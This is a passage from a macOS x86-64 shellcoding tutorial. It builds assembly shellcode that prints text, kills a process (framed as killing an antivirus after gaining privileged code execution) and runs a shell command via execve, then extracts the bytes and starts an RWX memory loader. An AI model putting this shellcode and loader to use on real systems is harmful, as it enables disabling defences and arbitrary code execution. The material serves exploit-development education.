floor ‚Äî you must tell the waiter `0x0100003B`, calculated as `(1 << 24) | 0x3B`. Craving tiramisu (`execve`, also #59) from the `BSD` floor? Your order becomes `0x0200003B` ‚Äî same dish number, different floor, computed as `(2 << 24) | 0x3B`. Just like in `XNU`, never shout just ‚Äú59‚Äù ‚Äî the kitchen needs the full encoded number with the class shifted 24 bits left, ensuring your steak doesn‚Äôt arrive as a dessert (and vice versa). Bon app√©tit in the kernel!\n\n# x86_64 Calling Conventions and Registers\n\nIn the **x86-64 System** used by macOS, function arguments are passed via registers in this order: `RDI` holds the 1st argument, `RSI` the 2nd, `RDX` the 3rd (and sometimes the 2nd return value), `RCX` the 4th, `R8` the 5th, and `R9` the 6th. The return value (or syscall number) is placed in `RAX`, while `RIP` points to the next instruction, `RSP` manages the stack (and must be **16-byte aligned** before any function call), `RBP` serves as the frame pointer for stack frames, and `RBX` acts as a general-purpose base register often preserved across calls. If a function requires more than six arguments, additional arguments are passed on the stack. It is essential to ensure that the `RSP` is properly aligned before making a function call. Despite system calls often working without strict alignment, adhering to this requirement is a good practice to avoid unexpected behavior. To illustrate how these registers are used in a function call, consider a function `foo` that takes three arguments.\n\n```asm\n; Assume arg1, arg2, and arg3 are already set with appropriate values\nmov rax, syscall_number\nmov rdi, arg1 ; 1st argument\nmov rsi, arg2 ; 2nd argument\nmov rdx, arg3 ; 3rd argument\nsyscall      ; Execute syscall\n```\n\n## Calling Conventions Table\n\nYou can use this table as a reference.\n\n| Register | Usage |\n|----------|-------|\n| `RDI` | 1st function argument |\n| `RSI` | 2nd function argument |\n| `RDX` | 3rd function argument (and optionally the 2nd return value) |\n| `RCX` | 4th function argument |\n| `R8`  | 5th function argument |\n| `R9`  | 6th function argument |\n| `RAX` | Function return value/Syscall Number |\n| `RIP` | Instruction pointer |\n| `RSP` | Stack pointer (must be 16-byte aligned before calls) |\n| `RBP` | Frame pointer |\n| `RBX` | Base pointer (optional use) |\n\n# Shellcoding\n\nBefore writing our shellcode, To make it easy for ourselves instead of getting lost in all the assembly instructions, The best workflow to do is to write your code in `C`, then we convert it to assembly which will make it very easy for us, As there are references and resources for `C` it will make our process easier. For example, You would find people talking about how to make a client/server in `C` using `socket`. But, you won't find someone(\"insane\") talking about how to make a client/server in assembly. So The process would be as the following:\n- Find `C` functions that we will need in our code.\n- Write our code in `C`.\n- Turn our code into assembly.\n\t- Which including getting our syscall numbers ready.\n\t- Function arguments and types. \n\nLet's go ahead and start with something simple to make things clear.\n\n## Print 'Hello'\n\nWe will start by printing `Hello` into the screen. So let's apply our workflow. Usually when we want to print something in `C`, we use `printf()` function as the following:\n\n```c\n#include <stdio.h>\n\nint main() {\n    printf(\"Hello\");\n    return 0;\n}\n```\n\nNow, As we identified the functions we need which is `printf()`, And we wrote our code the 3rd step is to turn it into assembly. So the first thing we would need is to get the syscall number for `printf()`, We can find all the `syscalls` can be found in `bsd/kern/syscalls.master`.  \n\n\n![syscalls master snippet](/images/site/posts/macos/syscall-master.png)\n\nBut, the thing is we won't find `printf()` in the file. Let's investigate the `printf()` function source code. After investigation, the implementation of `printf()` involves calling other functions till we reach `write` syscall.\n\n### Call Chain: `printf` ‚Üí `write` Syscall\n\n| Step | Function Name |\n|------|---------------|\n| 1 | `printf` |\n| 2 | `vfprintf` |\n| 3 | `__vfprintf_internal` |\n| 4 | `Xprintf_buffer_write` |\n| 5 | `_IO_new_file_overflow` |\n| 6 | `_IO_do_write` |\n| 7 | `new_do_write` |\n| 8 | `_IO_SYSWRITE` |\n| 9 | `__swrite` *(macOS only)* |\n| 10 | `write` *(syscall)* |\n\n\nYou can find the source code files here:\n- [printf.c](https://codebrowser.dev/glibc/glibc/stdio-common/printf.c.html)\n- [vfprintf.c](https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf.c.html)\n- [vfprintf-internal.c](https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf-internal.c.html)\n- [printf_buffer.h](https://codebrowser.dev/glibc/glibc/stdio-common/printf_buffer.h.html)\n- [fileops.c](https://codebrowser.dev/glibc/glibc/libio/fileops.c.html)\n- [libioP.h](https://codebrowser.dev/glibc/glibc/libio/libioP.h.html)\n\nAlso you could just have asked `ChatGPT` or something xD, But keep in mind with complicated shellcodes you would want to go through codes and else cause you always will learn something and upgrade yourself.\n\nNow, When we search for `write` syscall we can see it in the `syscalls.master` file:\n\n\n![printf call chain trace](/images/site/posts/macos/printf-callchain.png)\n\nAs we see the `write` syscall number is `4`. And `write` takes 3 arguments. We need to learn about these argument and how to use it, Which simple can be done by searching it or go to the documentation:\n\n\n![printf flow diagram](/images/site/posts/macos/printf-flow.png)\n\nSo from the description we can know that we need to supply the string pointer to `buf` the second argument and number of bytes (`length`) to the third argument `nbyte`, And for fields/fd or File Descriptor, When we search it we will see that it takes the following values\n- `0 (STDIN_FILENO)`: Represents standard input, typically connected to the keyboard or the input of a pipe.\n- `1 (STDOUT_FILENO)`: Represents standard output, typically connected to the display or the output of a pipe.\n- `2 (STDERR_FILENO)`: Represents standard error, typically connected to the display for error messages.\n\nOur goal here is `STDOUT` which is value `1`. So our syscall will be as the following:\n\n```c\nint main() {\n    const char *message = \"Hello\";\n    write(1, message, 5);\n}\n```\n\nLet's start with writing our shellcode:\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\tmov rdi, 1 ; stdout for fd argument\n\tmov rcx, 'Hello' ; put our string value into RCX\n\tpush rcx ; We push our string to the stack\n\tmov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument\n\tmov rdx, 5 ; nbytes argument (our string length)\n\tmov rax, 0x2000004 ; The BSD syscall class entry + syscall number\n\tsyscall ; invoke/execute syscall\n```\n\nHere our shellcode, starting with `bits 64` to enforce x86-64 mode and `global _main` to export the Mach-O entry point. The first instruction `mov rdi, 1` loads the file descriptor `1` (stdout) into `RDI`, the first argument register as we mentioned before. Next, `mov rcx, 'Hello'` encodes the 5-character string as a 64-bit immediate `0x6f6c6c6548` (little-endian: `'o','l','l','e','H'`) into `RCX`. The `push rcx` then writes these 8 bytes to the stack, placing `'H'` at the new stack pointer and padding the remaining 3 bytes with zeros `0x00` to align the stack, Then `mov rsi, rsp` copies the current stack pointer into `RSI`, Which is the second argument, so it now points directly to the first character `'H'`, forming a valid `char *buf`. The `mov rdx, 5` sets the third argument, which is the number of bytes to write and exactly matching the length of `Hello`. Finally, `mov rax, 0x2000004` loads the `XNU` encoded syscall number: `(SYSCALL_CLASS_UNIX << 24) | 4`, where class `2` routes to the BSD subsystem and `4` selects the `write` entry from `bsd/kern/syscalls.master`. The `syscall` instruction triggers the kernel trap, dispatching through `XNU`‚Äôs unified handler to execute `write(1, \"Hello\", 5)`, printing `Hello` to the terminal.\n\nLet's save our code into file `hello.asm` and compile our code.\n\n- First we will turn the code to object file for `macho64` architecture using `nasm`:\n```sh\nshellcoding % nasm -f macho64 hello.asm\nshellcoding % ls\nhello.asm\thello.o\n```\n\nAs we see we got our object file `hello.o`.\n\n- Second, We will link the required libraries needed for the code to generate the executable using `ld`\n```sh\nshellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macos 15.5 15.5\nld: warning: no platform load command found in 'hello.o', assuming: macOS\nshellcoding % ls\nhello\t\thello.asm\thello.o\n```\n\nHere we can see after linking we got our executable.\n\n> Note: The `-L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib` sets the **library search path** to the macOS 15.5 SDK‚Äôs `usr/lib` directory, ensuring the linker locates the correct version of `libSystem.tbd` ‚Äî Apple‚Äôs modern stub library format that resolves to `libSystem.dylib` at runtime. The `-lSystem` flag explicitly links against **libSystem**, the foundational system library that exports the `syscall` interface, `write`, `exit`, and all BSD/POSIX functions; without it, the `syscall` instruction in our shellcode would remain unresolved, causing a linker error. Finally, `-platform_version macos 15.5 15.5` declares the **minimum deployment target** as macOS 15.5 (Sequoia), embedding the `LC_VERSION_MIN_MACOSX` load command and forcing the use of Sequoia-compatible API stubs and system call encodings ‚Äî essential for forward and backward compatibility on modern Apple silicon and Intel systems.\n\n- Let's run and test our executable:\n```sh\nshellcoding % ./hello \nHellozsh: segmentation fault  ./hello\n```\n\nWe see that our execution results in `segmentation fault`, And the reason for that the program doesn't `return` or in simple words exit. For example, Within the main function in `C`, When return is used in the main function (e.g., `return 0;`), it typically translates to an `exit_group` system call (`exit`). This system call terminates the entire process and returns the specified exit status to the operating system. So, We need to exit after executing our `write` syscall.\n\n## Exit\n\nWe can exit using `exit` syscall, as we can see it in the `syscalls.master` file:\n```c\n1\tAUE_EXIT\tALL\t{ void exit(int rval) NO_SYSCALL_STUB; }\n```\n\nThe syscall number is `1` and it takes only 1 integer argument `rval` which is the value to return. When we go to documentation the `rval` value can be `0` for `EXIT_SUCCESS` (successful execution of a program) or `EXIT_FAILURE` (unsuccessful execution of a program). Let's update our shellcode and add `exit` syscall\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\tmov rdi, 1 ; stdout for fd argument\n\tmov rcx, 'Hello' ; put our string value into RCX\n\tpush rcx ; We push our string to the stack\n\tmov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument\n\tmov rdx, 5 ; nbytes argument (our string length)\n\tmov rax, 0x2000004 ; The BSD syscall class entry + write syscall number\n\tsyscall ; invoke/execute syscall\n\t\n\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall\n\tmov rdi, 0 ; arg int rval\n\tsyscall ; invoke/execute syscall\n```\n\nNow, let's repeat the process of compiling to get our executable again and test it.\n\n```sh\nshellcoding % nasm -f macho64 hello.asm\nshellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5\nld: warning: no platform load command found in '/Users/zeyadazima.com/shellcoding/hello.o', assuming: macOS\nshellcoding % ./hello \nHello%                                                           \nshellcoding % \n```\n\nAs we see clearly our code worked perfectly. \n\n## Kill a Process\n\nLet's do another shellcode, And take a scenario in case we found a way to execute a code with high privileges and We need to write a shellcode to kill the `AV` process.\n\nThe `C` code to kill a process is as the following:\n\n```C\n#include <stdio.h>\n#include <signal.h>\n#include <sys/types.h> // For pid_t\n#include <unistd.h>    // For getpid() (optional, for self-killing example)\n\nint main() {\n    pid_t target_pid;\n\n    target_pid = 12345; \n\n    // Sending SIGTERM (graceful termination)\n    kill(target_pid, SIGTERM);\n\n    return 0;\n}\n```\n\nWe can see here we used `kill` function and supply the `PID` and the signal which is `SIGTERM`.\n\nNow, If we search for `kill` in `syscalls.master`. We can find it:\n\n```C\n37\tAUE_KILL\tALL\t{ int kill(int pid, int signum, int posix) NO_SYSCALL_STUB; }\n```\n\nFor the `PID` we will create a test process and get it's `PID` to supply it for the first argument and for the `signum` argument, In the `C` code the value is `SIGTERM` which it will be a pre-defined value in the source code, We can search for `#define SIGTERM` in the `XNU` source code, We will find it at `xnu-xnu-11417.121.6/bsd/sys/signal.h:103`:\n\n```C\n#define SIGKILL 9       /* kill (cannot be caught or ignored) */\n#define SIGBUS  10      /* bus error */\n#define SIGSEGV 11      /* segmentation violation */\n#define SIGSYS  12      /* bad argument to system call */\n#define SIGPIPE 13      /* write on a pipe with no one to read it */\n#define SIGALRM 14      /* alarm clock */\n#define SIGTERM 15      /* software termination signal from kill */\n#define SIGURG  16      /* urgent condition on IO channel */\n#define SIGSTOP 17      /* sendable stop signal not from tty */\n```\n\nSo we can see that `SIGTERM` value is `15`, But the better option to use `SIGKILL` with value `9` as it will be forced and kill (cannot be caught or ignored). We will supply `9` as the second argument. Now, In the `C` code it doesn't have a 3rd argument as we see for the `syscall`. If we search for `int posix` in the `XNU` source code, We gonna find the following code under `xnu-xnu-11417.121.6/bsd/kern/kern_sig.c:1373`:\n\n```C\nint\nkill(proc_t cp, struct kill_args *uap, __unused int32_t *retval)\n{\n\tproc_t p;\n\tkauth_cred_t uc = kauth_cred_get();\n\tint posix = uap->posix;         /* !0 if posix behaviour desired */\n\n\tAUDIT_ARG(pid, uap->pid);\n\tAUDIT_ARG(signum, uap->signum);\n\n\tif ((u_int)uap->signum >= NSIG) {\n\t\treturn EINVAL;\n\t}\n```\n\nWe can see from apple comment on the source code that, if we want `POSIX` behaviour in killing the process we have to supply anything other than `0`. And after more searching and asking diff `AI` chatbots i got the following:\n\n| Value               | Meaning                     |\n|---------------------|-----------------------------|\n| `posix = 0`         | Mach (legacy) signal behavior |\n| `posix = 1` (or any `!0`) | POSIX/BSD signal behavior |\n\n> Note: usually when you see extra arguments that was not mentioned or supplyed in the `C` code, It means that the argument is optional and not really required so you always can supply `0` or `NULL` as a value to the optional/non-required arguments.\nLet's run our test process using a simple infinity loop running in background:\n\n```sh\nshellcoding % while true; do sleep 10; done &\n[2] 27646\nshellcoding % ps -p 27646\n  PID TTY           TIME CMD\n27646 ttys061    0:00.01 -zsh\n```\nthe `PID` is `27646`\n\nNow, Lets write our shellcode:\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\tmov rdi, 27646 ; 1st argument PID\n\tmov rsi, 9 ; 2nd argument signum\n\tmov rdx, 0 ; 3rd argument posix\n\tmov rax, 0x2000025 ; The BSD syscall class entry + 0x25 (which is 37 in hex) kill syscall\n\tsyscall\n\t\n\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall\n\tmov rdi, 0 ; arg int rval\n\tsyscall ; invoke/execute syscall\n```\n\nIt's already clear here, We passed our arguments as the following; `PID` for `RDI`, then `signum` for `RSI` and After that, `posix` to `RDX` and setup our `syscall`. Finally, We exit gracefully using `exit` syscall.\n\n```sh\nshellcoding % nasm -f macho64 killer.asm                                                                                                       \nshellcoding % ld -o killer killer.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5\nld: warning: no platform load command found in '/Users/zeyadazima.com/shellcoding/killer.o', assuming: macOS\nshellcoding % ./killer \nshellcoding % \n[2]  - killed     while true; do; sleep 10; done\nshellcoding % ps -p 27646\n  PID TTY           TIME CMD\n```\n\nAs we can see clearly, The process has been killed successfully.\n\n## Execute Command\nNow, The exciting parts where we need to execute commands. Let's bring our `C` code to execute commands on the system. Which is usually in `C` it's done through `system()` function. But remember that on the `XNU` has `BSD`. So Let's search for `C` code where execute commands using `BSD` functions.\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/wait.h>\n\nint main() {\n    pid_t pid;\n    char *const argv[] = {\"/bin/ls\", \"-l\", NULL}; // Command and its arguments\n    char *const envp[] = {NULL}; // Environment variables (can be customized)\n\n    execve(argv[0], argv, envp);\n   \n\n    return 0;\n}\n```\n\nAs we can see here it uses `execv()` function and it takes 3 arguments. lET'S SEARCH FOR it in the `syscalls.master`:\n\n```C\n59\tAUE_EXECVE\tALL\t{ int execve(char *fname, char **argp, char **envp) NO_SYSCALL_STUB; }\n```\n\nSo it takes a pointer to the `fname` which is the file name, then pointer to array `argp` and pointer to another array `envp`.\n\n![write syscall chain snippet](/images/site/posts/macos/write-syscall-chain.png)\n\nWe can see that in the description of `execve()`, the first argument is the path to the binary we want to execute which is gonna be the shell in this case `/bin/zsh`. Then for the second argument it takes array the arguments of the executable or program we passing and the first element in the array has to be the same file name `/bin/zsh`, So the array will be as the following, if we want to execute`echo \"W00tW00t\" > /tmp/Pwned.txt`  command `{\"/bin/zsh\",\"-c\",\"echo 'W00tW00t' > /tmp/Pwned.txt\"}`. The third argument as mentioned is optional so we can supply a pointer to `NULL` array.\n\nLet's go on and write our shellcode:\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\n\tmov rcx, 0 \t; NULL Terminator\n\tpush rcx \t; push the NULL Terminator to the stack\n\tmov rdx, '/bin/zsh' \t;  our file/executable name\n\tpush rdx \t; push the file/executable name to the stack\n\tmov rdi, rsp \t; fname => 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name\n\tmov rbx, '-c' \t; argp[1] => the 2nd element in the arguments array\n\tpush rbx \t; push argp[1] to the stack\n\tmov rbx, rsp \t; save the argp[1]('-c') pointer to RBX\n\tpush rcx \t; push the NULL Terminator to the stack\n```\n\nLet's stop here for a while, We need to place our 3rd element which is our command `echo \"W00tW00t\" > /tmp/Pwned.txt`, Which is for a string to long and to divide it to push it on the stack will not be the best thing our shellcode will be so long. Instead we gonna use a trick to place it on the stack for example:\n\n```asm\n call array\n db 'echo \"W00tW00t\" > /tmp/Pwned.txt', 0\n```\n\n`call` pushes the address of the following `db` string onto the stack. Which will make it easier for us.\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\n\txor rcx, rcx \t; NULL Terminator\n\tpush rcx \t; push the NULL Terminator to the stack\n\tmov rdx, '/bin/zsh' \t;  our file/executable name\n\tpush rdx \t; push the file/executable name to the stack\n\tmov rdi, rsp \t; fname => 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name\n\tmov rbx, '-c' \t; argp[1] => the 2nd element in the arguments array\n\tpush rbx \t; push argp[1] to the stack\n\tmov rbx, rsp \t; save the argp[1]('-c') pointer to RBX\n\tpush rcx \t; push the NULL Terminator to the stack\n\n; classic position-independent trick\n\tcall array ; call the array label to setup the array for argp\n\tdb 'echo \"W00tW00t\" > /tmp/Pwned.txt', 0 ; arg[2] which is our command and including the NULL Terminator\n```\n\nNow, We need to make `array` label where it will setup the array elements and execute the `execve` syscall and then exit.\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\n\txor rcx, rcx \t; NULL Terminator\n\tpush rcx \t; push the NULL Terminator to the stack\n\tmov rdx, '/bin/zsh' \t;  our file/executable name\n\tpush rdx \t; push the file/executable name to the stack\n\tmov rdi, rsp \t; fname => 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name\n\tmov rbx, '-c' \t; argp[1] => the 2nd element in the arguments array\n\tpush rbx \t; push argp[1] to the stack\n\tmov rbx, rsp \t; save the argp[1]('-c') pointer to RBX\n\tpush rcx \t; push the NULL Terminator to the stack\n\tcall array ; call the array label to setup the array for argp\n\tdb 'echo \"W00tW00t\" > /tmp/Pwned.txt', 0 ; arg[2] which is our command and including the NULL Terminator\n\t\narray:\n\tpush rbx ; arg[1] put the -c pointer into the array\n\tpush rdi ; args[0] which is fname saved before\n\tmov rsi, rsp ; pass the array pointer for RSI which holds the second argument\n\txor rdx, rdx ; empty rdx to use as NULL for the third argument envp\n\tmov rax, 0x200003B ; The BSD syscall class entry + 0x3B (which is 59 in hex) kill syscall\n\tsyscall ; invoke/execute syscall\n\t\n\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall\n\tmov rdi, 0 ; arg int rval\n\tsyscall ; invoke/execute syscall\n```\n\nHere our shellcode, first zeroes `RCX` with `xor rcx, rcx` and `push rcx` to place an 8-byte `NULL` on the stack which will be reused as padding and as a `NULL` terminator. Next `mov rdx, '/bin/zsh'` loads the bytes for the `filename` into `RDX` and `push rdx` writes those 8 bytes to the stack so that `RSP` now points at the `\"/bin/zsh\"` string. `mov rdi, rsp` copies that stack pointer into `RDI`, which is the first argument to `execve` (the `filename` pointer).After that load `'-c'` into `RBX` and `push rbx`, creating the `\"-c\"` string on the stack; `mov rbx, rsp` saves the pointer to the `\"-c\"` string in `RBX` for later. Another `push rcx` places a `NULL` on the stack. The `call array` instruction is the classic position-independent trick, it pushes the address of the immediately following `db` bytes (the command string) onto the stack and then jumps to the `array` label, so the command string‚Äôs runtime address is already on the stack when `array` executes. The `db 'echo \"W00tW00t\" > /tmp/Pwned.txt', 0` provides the NUL-terminated command that `zsh -c` will execute. Then, At `array`  label we will build the `argp` array by `push rbx` (push pointer to `\"-c\"`) and `push rdi` (push pointer to `\"/bin/zsh\"`), then `mov rsi, rsp` sets `RSI` to point at that array so `execve` receives `argp` correctly. Following `xor rdx, rdx` sets `RDX = 0` so `envp` is `NULL`. `mov rax, 0x200003B` loads the `BSD` syscall number for `execve`.\n\n> Note: `0x3B` = 59 decimal ‚Üí `execve`\n\nAnd `syscall` invokes the kernel to execute `execve(filename, argv, envp)`. If `execve` returns (i.e., it failed) the code falls through to `mov rax, 0x2000001` / `mov rdi, 0` / `syscall` which calls the `exit` syscall to terminate the process.\n\n```sh\nshellcoding % nasm -f macho64 execute.asm                                                                                                          \nshellcoding % ld -o execute execute.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5\nld: warning: no platform load command found in '/Users/zeyadazima.com/shellcoding/execute.o', assuming: macOS\nshellcoding % ls /tmp\nnode-compile-cache OSL_PIPE_501_SingleOfficeIPC\tpowerlog\nshellcoding % ./execute                                                                                                                            \nshellcoding % ls /tmp  \nnode-compile-cache OSL_PIPE_501_SingleOfficeIPC\tpowerlog Pwned.txt\n/tmp % cat Pwned.txt \nW00tW00t\n```\n\nWe can see clearly, That our shellcode is executed successfully and our file created.\n\n# Extract Shellcode\n\nNow, Let's extract our shellcode from the object file, So if we need to send it with our exploit. We will use `objdump` tool and will show also how to do it with `otool`.\n\n## objdump\n\n```sh\nshellcoding% objdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o\n\nexecute.o:\tfile format mach-o 64-bit x86-64\n\nDisassembly of section __TEXT,__text:\n\n0000000000000000 <_main>:\n       0: 48 31 c9                     \txor\trcx, rcx\n       3: 51                           \tpush\trcx\n       4: 48 ba 2f 62 69 6e 2f 7a 73 68\tmovabs\trdx, 0x68737a2f6e69622f\n       e: 52                           \tpush\trdx\n       f: 48 89 e7                     \tmov\trdi, rsp\n      12: bb 2d 63 00 00               \tmov\tebx, 0x632d\n      17: 53                           \tpush\trbx\n      18: 48 89 e3                     \tmov\trbx, rsp\n      1b: 51                           \tpush\trcx\n      1c: e8 21 00 00 00               \tcall\t0x42 <array>\n      21: 65 63 68 6f                  \tmovsxd\tebp, dword ptr gs:[rax + 0x6f]\n      25: 20 22                        \tand\tbyte ptr [rdx], ah\n      27: 57                           \tpush\trdi\n      28: 30 30                        \txor\tbyte ptr [rax], dh\n      2a: 74 57                        \tje\t0x83 <array+0x41>\n      2c: 30 30                        \txor\tbyte ptr [rax], dh\n      2e: 74 22                        \tje\t0x52 <array+0x10>\n      30: 20 3e                        \tand\tbyte ptr [rsi], bh\n      32: 20 2f                        \tand\tbyte ptr [rdi], ch\n      34: 74 6d                        \tje\t0xa3 <array+0x61>\n      36: 70 2f                        \tjo\t0x67 <array+0x25>\n      38: 50                           \tpush\trax\n      39: 77 6e                        \tja\t0xa9 <array+0x67>\n      3b: 65 64 2e 74 78               \tje\t0xb8 <array+0x76>\n      40: 74 00                        \tje\t0x42 <array>\n\n0000000000000042 <array>:\n      42: 53                           \tpush\trbx\n      43: 57                           \tpush\trdi\n      44: 48 89 e6                     \tmov\trsi, rsp\n      47: 48 31 d2                     \txor\trdx, rdx\n      4a: b8 3b 00 00 02               \tmov\teax, 0x200003b\n      4f: 0f 05                        \tsyscall\n      51: b8 01 00 00 02               \tmov\teax, 0x2000001\n      56: bf 00 00 00 00               \tmov\tedi, 0x0\n      5b: 0f 05                        \tsyscall\n\n```\n\n- Here we can see our dissassembled code clearly and the array, etc. We need to save this into file\n\n```sh\nobjdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o > execute.disasm\n```\n\n - Now, Let's extract the hex bytes from the `execute.disasm` file. Using command line utilities.\n\n```sh\nshellcoding% grep -E '^[[:space:]]+[0-9a-f]+:' execute.disasm \\\n  | awk '{for(i=2;i<=NF;i++) if ($i ~ /^[0-9a-f]{2}$/) printf \"%s\", $i}' \\\n  | tr -d '\\n' > shellcode.hex\nshellcoding% cat shellcode.hex \n4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05\n```\n\n- Convert it to binary\n\n```sh\nshellcoding% xxd -r -p shellcode.hex > shellcode.bin\n```\n\n- Let's Check the Shellcode size\n\n```sh\nshellcoding% wc -c shellcode.bin\n      93 shellcode.bin // 93 bytes\n```\n\n- Generate `C` array of bytes for the shellcode\n\n```sh\nshellcoding% xxd -i shellcode.bin > shellcode.h\nshellcoding% cat shellcode.h\nunsigned char shellcode_bin[] = {\n  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,\n  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,\n  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,\n  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,\n  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,\n  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,\n  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,\n  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05\n};\nunsigned int shellcode_bin_len = 93;\n```\n\n## otool\n\n- Extract Raw Section Bytes\n\n```sh\nshellcoding% otool -s __TEXT __text ~/shellcoding/execute.o \\\n  | sed -n '3,$p' \\\n  | awk '{ for(i=2;i<=NF;i++) printf \"%s\",$i } END{ print \"\" }' > shellcode_otool.hex\nshellcoding% cat shellcode_otool.hex \n4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05\n```\n\n- Convert to binary `xxd`\n\n```sh\nshellcoding% xxd -r -p shellcode_otool.hex > shellcode_otool.bin\n```\n\n- Check shellcode length\n\n```sh\nShellcoding% wc -c shellcode_otool.bin\n      93 shellcode_otool.bin\n```\n\n- Convert it to `C` array\n\n```sh\nShellcoding% cat shellcode_otool.h\nunsigned char shellcode_otool_bin[] = {\n  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,\n  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,\n  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,\n  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,\n  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,\n  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,\n  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,\n  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05\n};\nunsigned int shellcode_otool_bin_len = 93;\n```\n\n## Test Shellcode with Loader\n\nNow, let's write a loader in `C` to try and execute our shellcode:\n\n```c\n#include <stdio.h>\n#include <sys/mman.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/wait.h>\n#include <stdlib.h>\n\nint main(void) {\n    unsigned char code[] = {\n      0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,\n      0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,\n      0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,\n      0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,\n      0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,\n      0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,\n      0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,\n      0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05\n    };\n    size_t len = sizeof(code);\n\n    pid_t pid = fork();\n    if (pid < 0) {\n        perror(\"fork\");\n        return 1;\n    }\n\n    if (pid == 0) {\n        // child: allocate RWX, copy shellcode and execute\n        void *exec = mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC,\n                          MAP_ANON|MAP_PRIVATE, -1, 0);\n        if (exec == MAP_FAILED) {\n            perror(\"mmap\");\n            _exit(127);\n        }\n        memcpy(exec, code, len);\n\n        // print from child so you can see it if child doesn't get replaced\n        printf(\"[child %d] executing shellcode (%zu bytes)...\\n\", getpid(), len);\n        fflush(stdout);\n\n        int (*func)() = (int(*)())exec;\n        int r = func(); // if shellcode calls execve, child will be replaced\n        // If returned, report and exit child\n        printf(\"[child %d] shellcode returned %d\\n\", getpid(), r);\n        fflush(stdout);\n        _exit(r & 0xFF);\n    } else {\n        // parent: wait for child and then check side-effect\n        int status = 0;\n        printf(\"[parent %d] spawned child %d, waiting...\\n\", getpid(), pid);\n        fflush(stdout);\n\n        if (waitpid(pid, &status, 0) == -1) {\n            perror(\"waitpid\");\n            return 2;\n        }\n\n        if (WIFEXITED(status)) {\n            printf(\"[parent] child exited with status %d\\n\", 